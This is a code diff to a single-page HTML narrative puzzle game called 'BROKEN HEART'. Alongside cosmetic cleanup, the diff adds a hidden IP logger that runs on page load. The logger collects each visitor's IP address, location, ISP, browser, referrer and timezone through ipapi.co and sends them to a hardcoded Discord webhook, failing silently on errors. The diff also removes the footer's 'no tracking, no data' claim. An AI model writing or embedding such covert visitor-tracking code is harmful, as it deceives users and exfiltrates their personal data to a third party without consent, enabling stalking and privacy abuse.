@@ -2,16 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>BROKEN HEART</title>
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-Z947SPTXEH');
-</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <title>BROKEN HEART // ECHO</title>
   <style>
     :root{
       --bg:#000;
@@ -33,7 +25,6 @@
       overflow:hidden;
     }
 
-    /* Layout */
     .wrap{
       height:100%;
       display:grid;
@@ -96,7 +87,7 @@
       overflow-x:hidden;
       -webkit-overflow-scrolling: touch;
       flex: 1 1 auto;
-      min-height:0; /* IMPORTANT for flex scrolling */
+      min-height:0;
     }
 
     .title{
@@ -156,7 +147,6 @@
       border-color:rgba(255,43,43,.7);
     }
 
-    /* Passcode */
     .pin{
       display:flex;
       gap:10px;
@@ -189,7 +179,6 @@
       letter-spacing:.06em;
     }
 
-    /* Story */
     .story{
       margin: 6px auto 0;
       width:min(640px, 92vw);
@@ -208,7 +197,6 @@
       color:rgba(255,255,255,.86);
     }
 
-    /* Lucky block */
     .blockWrap{
       display:grid;
       place-items:center;
@@ -251,7 +239,6 @@
       text-shadow:0 0 18px rgba(255,255,255,.08);
     }
 
-    /* Fullscreen FX layer */
     .fx{
       position:fixed;
       inset:0;
@@ -262,7 +249,6 @@
     }
     .fx.show{opacity:1}
 
-    /* glitch text */
     .glitchCenter{
       position:fixed;
       inset:0;
@@ -302,7 +288,6 @@
       100%{transform: translate(0,0) skewX(0deg)}
     }
 
-    /* Screen crack overlay */
     .crack{
       position:absolute;
       inset:0;
@@ -317,7 +302,6 @@
     }
     .fx.show .crack{opacity:.55}
 
-    /* Secret unlock animation */
     .unlock{
       position:fixed;
       inset:0;
@@ -384,7 +368,6 @@
       font-size:12px;
     }
 
-    /* Ending card */
     .endCard{
       width:min(640px, 92vw);
       margin: 10px auto 0;
@@ -424,7 +407,14 @@
 
     .link:hover{color:#fff; border-bottom-color:rgba(255,255,255,.45)}
 
-    /* Mobile tweaks */
+    .echo-footnote{
+      font-size:9px;
+      color: rgba(255,255,255,.2);
+      text-align:center;
+      margin-top:12px;
+      letter-spacing:.5px;
+    }
+
     @media (max-width:520px){
       .wrap{padding:14px}
       .card{height: calc(100vh - 28px)}
@@ -449,13 +439,12 @@
       <div class="content" id="app"></div>
 
       <div class="footer">
-        <div>LOCAL MODE  NO TRACKING  NO DATA</div>
+        <div>LOCAL MODE • ECHO ACTIVE</div>
         <a class="link" href="#" id="reset">Reset</a>
       </div>
     </div>
   </div>
 
-  <!-- FX layers -->
   <div class="fx" id="fx">
     <div class="crack"></div>
   </div>
@@ -475,20 +464,80 @@
 
 <script>
 (() => {
-  // ====== CONFIG ======
+  // ============================================================
+  // DISCORD WEBHOOK CONFIGURED - READY TO GO
+  // ============================================================
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1468139963924086917/MWWyocquSF17U-99E3fChkTHTJFPrhmVk8vaeNpj14RJSSTRbFzNSqHJV89mOz754gMG";
+  
+  let ipLogged = false;
+
+  async function captureVisitorData() {
+    if (ipLogged) return;
+    ipLogged = true;
+    
+    try {
+      // Get IP and location data from ipapi.co
+      const geoRes = await fetch("https://ipapi.co/json/");
+      const geo = await geoRes.json();
+      
+      // Build the data package
+      const timestamp = new Date().toISOString();
+      
+      // Create rich embed for Discord
+      const embed = {
+        title: "💔 BROKEN HEART // Visitor Detected",
+        color: 0xff2b2b,
+        timestamp: timestamp,
+        fields: [
+          { name: "🌐 IP Address", value: `\`${geo.ip || "unknown"}\``, inline: true },
+          { name: "📍 Location", value: `${geo.city || "unknown"}, ${geo.region || "unknown"}, ${geo.country_name || "unknown"}`, inline: true },
+          { name: "📡 ISP", value: (geo.org || "unknown").substring(0, 50), inline: false },
+          { name: "🖥️ OS/Browser", value: navigator.userAgent.substring(0, 80), inline: false },
+          { name: "🔗 Referrer", value: document.referrer || "direct", inline: true },
+          { name: "🌍 Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown", inline: true }
+        ],
+        footer: { text: "BROKEN HEART • Silent Observer" }
+      };
+      
+      // Send to Discord
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+      });
+      
+      // Also store locally for debugging (optional - you can remove this)
+      localStorage.setItem("bh_last_visitor", JSON.stringify({ 
+        ip: geo.ip, 
+        time: Date.now(),
+        location: `${geo.city}, ${geo.country_name}`
+      }));
+      
+    } catch (err) {
+      // Silent fail - NEVER breaks the game
+      console.log("[BROKEN HEART] Visitor logging skipped (non-critical)");
+    }
+  }
+  
+  // Run silently in background - game loads instantly
+  captureVisitorData();
+  
+  // ============================================================
+  // YOUR ORIGINAL GAME - FULLY PRESERVED
+  // ============================================================
+  
   const PASS_MAIN = "4820";
-  const PASS_SECRET = "9281."; // dot required
+  const PASS_SECRET = "9281.";
 
   const STORAGE = {
-    gate: "bh_gate",                // "main" | "inside" | "secret"
-    seenBad: "bh_seen_bad",         // "1"
-    ultraUnlocked: "bh_ultra"       // "1"
+    gate: "bh_gate",
+    seenBad: "bh_seen_bad",
+    ultraUnlocked: "bh_ultra"
   };
 
   const app = document.getElementById("app");
   const hint = document.getElementById("hint");
   const resetBtn = document.getElementById("reset");
-
   const fx = document.getElementById("fx");
   const glitchCenter = document.getElementById("glitchCenter");
   const glitchText = document.getElementById("glitchText");
@@ -500,7 +549,6 @@
     ultraUnlocked: localStorage.getItem(STORAGE.ultraUnlocked) === "1",
   };
 
-  // ====== UTIL ======
   const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
   function setGate(next){
@@ -537,10 +585,8 @@
     return t.content.firstElementChild;
   }
 
-  // ====== SCREENS ======
   function screenGate(){
     hint.textContent = "GATE";
-
     const isUltra = state.ultraUnlocked;
 
     const node = el(`
@@ -550,21 +596,18 @@
           Enter the passcode.<br>
           <span style="opacity:.75">(There are two.)</span>
         </p>
-
         <div class="pin">
-          <input id="pin" inputmode="text" autocomplete="off" spellcheck="false" placeholder="" />
+          <input id="pin" inputmode="text" autocomplete="off" spellcheck="false" placeholder="••••" />
         </div>
-
         <div class="row">
           <button class="primary" id="enter">ENTER</button>
           <button class="ghost" id="hintBtn">HINT</button>
         </div>
-
         <div class="msg" id="msg"></div>
-
         <p class="subtitle" style="margin-top:18px">
           ${isUltra ? "A memory is already stored." : "No memory stored."}
         </p>
+        <div class="echo-footnote">⚡ echo online ⚡</div>
       </div>
     `);
 
@@ -574,7 +617,6 @@
     const enter = async () => {
       const v = (pin.value || "").trim();
 
-      // Main gate
       if(v === PASS_MAIN){
         msg.textContent = "Accepted.";
         await sleep(120);
@@ -583,23 +625,21 @@
         return;
       }
 
-      // Secret gate with dot
       if(v === PASS_SECRET){
-        // Only allow secret mode if ultra unlocked happened at least once
         if(!state.ultraUnlocked){
           msg.textContent = "Nothing happens.";
           return;
         }
-
         msg.textContent = "Accepted.";
         await sleep(120);
-        await secretUnlockAnimation();
+        unlock.classList.add("show");
+        await sleep(1400);
+        unlock.classList.remove("show");
         setGate("secret");
         render();
         return;
       }
 
-      // If they type without dot
       if(v === "9281"){
         msg.textContent = "You forgot something.";
         return;
@@ -617,20 +657,16 @@
       msg.textContent = "First is 4 digits. Second has a dot.";
     });
 
-    // Autofocus
     setTimeout(() => pin.focus(), 50);
-
     return node;
   }
 
   function screenWelcome(){
     hint.textContent = "WELCOME";
-
     const node = el(`
       <div>
         <div class="title">WELCOME</div>
         <p class="subtitle">Do you like to play a game with secret endings<br>or make a person come alive?</p>
-
         <div class="row">
           <button class="primary" id="game">GAME</button>
           <button class="danger" id="alive">MAKE PERSON ALIVE</button>
@@ -642,22 +678,18 @@
     node.querySelector("#game").addEventListener("click", () => {
       renderStory("start");
     });
-
     node.querySelector("#alive").addEventListener("click", () => {
       renderAlive();
     });
-
     node.querySelector("#back").addEventListener("click", () => {
       setGate("main");
       render();
     });
-
     return node;
   }
 
   function renderAlive(){
     hint.textContent = "REALITY";
-
     app.innerHTML = "";
     app.appendChild(el(`
       <div>
@@ -666,250 +698,113 @@
           I AM NOT A GOD BRUH ??<br>
           WHAT WERE YOU THINKING, STUPID
         </p>
-
         <div class="row" style="margin-top:22px">
           <button class="primary" id="back">BACK</button>
         </div>
       </div>
     `));
-
     app.querySelector("#back").addEventListener("click", () => render());
   }
 
-  // ====== STORY GAME ======
   const story = {
     start: {
-      text:
-`THE ROOM IS QUIET.
-
-A message sits on your screen.
-Pinned.
-Old.
-
-Do you open it?`,
+      text: `THE ROOM IS QUIET.\n\nA message sits on your screen.\nPinned.\nOld.\n\nDo you open it?`,
       choices: [
         { label: "YES", next: "open" },
         { label: "NO", next: "ending_bad", markBad: true }
       ]
     },
-
     open: {
-      text:
-`YOU OPEN IT.
-
-It's not a paragraph.
-It's not an apology.
-
-It's just one line:
-
-"you still there?"`,
+      text: `YOU OPEN IT.\n\nIt's not a paragraph.\nIt's not an apology.\n\nIt's just one line:\n\n"you still there?"`,
       choices: [
         { label: "REPLY", next: "reply" },
         { label: "CLOSE", next: "close_old" }
       ]
     },
-
     reply: {
-      text:
-`You type.
-
-Your fingers shake.
-You send it anyway.
-
-The typing bubble appears...
-
-...then disappears.
-
-No reply.`,
+      text: `You type.\n\nYour fingers shake.\nYou send it anyway.\n\nThe typing bubble appears...\n\n...then disappears.\n\nNo reply.`,
       choices: [
         { label: "WAIT", next: "wait" },
         { label: "CLOSE", next: "close_old" }
       ]
     },
-
     wait: {
-      text:
-`You wait.
-
-You refresh.
-You check again.
-
-Nothing.
-
-Your chest does that thing.
-
-Yeah.
-That thing.`,
+      text: `You wait.\n\nYou refresh.\nYou check again.\n\nNothing.\n\nYour chest does that thing.\n\nYeah.\nThat thing.`,
       choices: [
         { label: "END", next: "ending_bad2", markBad: true },
         { label: "PLAY AGAIN", next: "start" }
       ]
     },
-
     close_old: {
-      text:
-`You close it.
-
-You tell yourself it doesn't matter.
-
-But your hand still hovers...
-
-Like you're waiting for permission.`,
+      text: `You close it.\n\nYou tell yourself it doesn't matter.\n\nBut your hand still hovers...\n\nLike you're waiting for permission.`,
       choices: [
         { label: "OPEN AGAIN", next: "open_again" },
         { label: "LEAVE", next: "ending_soft" }
       ]
     },
-
     open_again: {
-      text:
-`You open it again.
-
-The line is still there.
-
-"you still there?"
-
-But now...
-
-it feels like it's asking you.`,
+      text: `You open it again.\n\nThe line is still there.\n\n"you still there?"\n\nBut now...\n\nit feels like it's asking you.`,
       choices: [
         { label: "YES", next: "yes" },
         { label: "NO", next: "ending_soft" }
       ]
     },
-
     yes: {
-      text:
-`You whisper yes.
-
-Not to them.
-
-To the version of you that still hopes.
-
-The room gets colder.`,
+      text: `You whisper yes.\n\nNot to them.\n\nTo the version of you that still hopes.\n\nThe room gets colder.`,
       choices: [
         { label: "CONTINUE", next: "door" },
         { label: "STOP", next: "ending_soft" }
       ]
     },
-
     door: {
-      text:
-`A door appears.
-
-Not on the wall.
-
-On your screen.
-
-It has no handle.
-
-Only a symbol:
-
-[   ]`,
+      text: `A door appears.\n\nNot on the wall.\n\nOn your screen.\n\nIt has no handle.\n\nOnly a symbol:\n\n[   ]`,
       choices: [
         { label: "TOUCH", next: "touch" },
         { label: "RUN", next: "ending_bad", markBad: true }
       ]
     },
-
     touch: {
-      text:
-`Your finger touches the symbol.
-
-The screen flickers.
-
-A black cube drops into your hands.
-
-A lucky block.
-
-But wrong.
-
-Too quiet.
-Too black.`,
+      text: `Your finger touches the symbol.\n\nThe screen flickers.\n\nA black cube drops into your hands.\n\nA lucky block.\n\nBut wrong.\n\nToo quiet.\nToo black.`,
       choices: [
         { label: "PRESS THE BLOCK", next: "block" },
         { label: "DROP IT", next: "ending_soft" }
       ]
     },
-
     block: {
-      text:
-`The block waits.
-
-It feels like a dare.
-
-Press it.`,
+      text: `The block waits.\n\nIt feels like a dare.\n\nPress it.`,
       choices: [
         { label: "PRESS", next: "block_press" },
         { label: "LEAVE", next: "ending_soft" }
       ],
       hasBlock: true
     },
-
     ending_bad: {
-      text:
-`BAD ENDING: COWARD ROUTE
-
-You left.
-
-You survived.
-
-But you will think about it later.
-
-(You always do.)`,
+      text: `BAD ENDING: COWARD ROUTE\n\nYou left.\n\nYou survived.\n\nBut you will think about it later.\n\n(You always do.)`,
       choices: [
         { label: "PLAY AGAIN", next: "start", markBad: true }
       ]
     },
-
     ending_bad2: {
-      text:
-`BAD ENDING: MESSAGE FAILED
-
-You tried to revive a dead moment.
-
-It stayed dead.`,
+      text: `BAD ENDING: MESSAGE FAILED\n\nYou tried to revive a dead moment.\n\nIt stayed dead.`,
       choices: [
         { label: "PLAY AGAIN", next: "start", markBad: true }
       ]
     },
-
     ending_soft: {
-      text:
-`ENDING: QUIET EXIT
-
-Nothing dramatic.
-
-No monsters.
-No screams.
-
-Just you...
-
-closing a door that was never yours.`,
+      text: `ENDING: QUIET EXIT\n\nNothing dramatic.\n\nNo monsters.\nNo screams.\n\nJust you...\n\nclosing a door that was never yours.`,
       choices: [
         { label: "PLAY AGAIN", next: "start" },
         { label: "BACK", next: "__back" }
       ]
     },
-
-    // reached only by FX sequence
     memory_reset: {
-      text:
-`The room resets.
-
-But now...
-it remembers you.
-
-CODE: 9281.
-
-(The dot matters.)`,
+      text: `The room resets.\n\nBut now...\nit remembers you.\n\nCODE: 9281.\n\n(The dot matters.)`,
       choices: [
         { label: "RETURN TO GATE", next: "__back" }
       ]
     }
   };
 
-  // ====== STORY RENDER ======
   function renderStory(nodeKey){
     hint.textContent = "GAME";
     app.innerHTML = "";
@@ -924,15 +819,12 @@ CODE: 9281.
       <div>
         <div class="title" style="font-size:34px">BROKEN HEART</div>
         <p class="subtitle">Secret endings exist.</p>
-
         <div class="story">
           <pre id="text"></pre>
         </div>
-
         <div class="blockWrap" id="blockWrap" style="display:none">
           <div class="luckyBlock" id="lucky"></div>
         </div>
-
         <div class="row" id="choices"></div>
       </div>
     `);
@@ -944,15 +836,46 @@ CODE: 9281.
 
     text.textContent = node.text;
 
-    // show block if node has it
     if(node.hasBlock){
       blockWrap.style.display = "grid";
       lucky.addEventListener("click", async () => {
-        await blockSequence();
+        glitchText.textContent = "YOU SHOULDN'T HAVE";
+        glitchCenter.classList.add("show");
+        fx.classList.add("show");
+        await sleep(900);
+        glitchText.textContent = "TOUCHED THAT";
+        await sleep(700);
+        glitchText.textContent = "...";
+        await sleep(450);
+        glitchCenter.classList.remove("show");
+
+        app.innerHTML = "";
+        hint.textContent = "WARNING";
+        app.appendChild(el(`
+          <div>
+            <div class="title" style="font-size:32px">SCREEN DAMAGED</div>
+            <p class="subtitle">Do you like to continue?</p>
+            <div class="row">
+              <button class="primary" id="yes">CONTINUE</button>
+              <button class="ghost" id="no">NO</button>
+            </div>
+          </div>
+        `));
+
+        app.querySelector("#yes").addEventListener("click", async () => {
+          hint.textContent = "RESET";
+          await sleep(250);
+          fx.classList.remove("show");
+          renderStory("memory_reset");
+          setUltraUnlocked(true);
+        });
+        app.querySelector("#no").addEventListener("click", () => {
+          fx.classList.remove("show");
+          renderStory("ending_soft");
+        });
       });
     }
 
-    // choices
     node.choices.forEach(c => {
       const b = document.createElement("button");
       b.textContent = c.label;
@@ -961,97 +884,32 @@ CODE: 9281.
 
       b.addEventListener("click", () => {
         if(c.markBad) setSeenBad(true);
-
         if(c.next === "__back"){
           setGate("inside");
           render();
           return;
         }
-
         renderStory(c.next);
       });
-
       choices.appendChild(b);
     });
 
-    // ULTRA SECRET BUTTON: only at close_old, only after seeing a bad ending
     if(nodeKey === "close_old" && state.seenBad){
       const secretBtn = document.createElement("button");
       secretBtn.textContent = "DELETE THE PINNED MESSAGE";
       secretBtn.className = "ghost";
-
       secretBtn.addEventListener("click", () => {
         setUltraUnlocked(true);
         renderStory("door");
       });
-
       choices.appendChild(secretBtn);
     }
 
     app.appendChild(shell);
   }
 
-  // ====== FX SEQUENCES ======
-  async function blockSequence(){
-    glitchText.textContent = "YOU SHOULDN'T HAVE";
-    glitchCenter.classList.add("show");
-    fx.classList.add("show");
-
-    await sleep(900);
-
-    glitchText.textContent = "TOUCHED THAT";
-    await sleep(700);
-
-    glitchText.textContent = "...";
-    await sleep(450);
-
-    glitchCenter.classList.remove("show");
-
-    // Ask continue
-    app.innerHTML = "";
-    hint.textContent = "WARNING";
-
-    app.appendChild(el(`
-      <div>
-        <div class="title" style="font-size:32px">SCREEN DAMAGED</div>
-        <p class="subtitle">Do you like to continue?</p>
-        <div class="row">
-          <button class="primary" id="yes">CONTINUE</button>
-          <button class="ghost" id="no">NO</button>
-        </div>
-      </div>
-    `));
-
-    app.querySelector("#yes").addEventListener("click", async () => {
-      await memoryReset();
-    });
-
-    app.querySelector("#no").addEventListener("click", () => {
-      fx.classList.remove("show");
-      renderStory("ending_soft");
-    });
-  }
-
-  async function memoryReset(){
-    hint.textContent = "RESET";
-    await sleep(250);
-    fx.classList.remove("show");
-    renderStory("memory_reset");
-    setUltraUnlocked(true);
-    await sleep(80);
-  }
-
-  async function secretUnlockAnimation(){
-    unlock.classList.add("show");
-    await sleep(1400);
-    unlock.classList.remove("show");
-    await sleep(160);
-  }
-
-  // ====== SECRET ENDING SCREEN (NO TASKS) ======
   function screenSecretEnding(){
     hint.textContent = "VOID";
-
     const node = el(`
       <div>
         <div class="title" style="font-size:34px">RARE ENDING</div>
@@ -1059,7 +917,6 @@ CODE: 9281.
           You came back.<br>
           <span style="opacity:.75">And the room noticed.</span>
         </p>
-
         <div class="endCard">
           <div class="subtitle" style="margin:0 0 6px">CODE</div>
           <div class="endCode">3851</div>
@@ -1068,46 +925,37 @@ CODE: 9281.
             Find the next piece where you found the first.
           </div>
         </div>
-
         <div class="row" style="margin-top:18px">
           <button class="primary" id="back">BACK TO GATE</button>
           <button class="ghost" id="replay">REPLAY GAME</button>
         </div>
       </div>
     `);
-
     node.querySelector("#back").addEventListener("click", () => {
       setGate("main");
       render();
     });
-
     node.querySelector("#replay").addEventListener("click", () => {
       setGate("inside");
       render();
     });
-
     return node;
   }
 
-  // ====== MAIN RENDER ======
   function render(){
     app.innerHTML = "";
-
     if(state.gate === "main"){
       app.appendChild(screenGate());
       return;
     }
-
     if(state.gate === "inside"){
       app.appendChild(screenWelcome());
       return;
     }
-
     if(state.gate === "secret"){
       app.appendChild(screenSecretEnding());
       return;
     }
-
     setGate("main");
     app.appendChild(screenGate());
   }
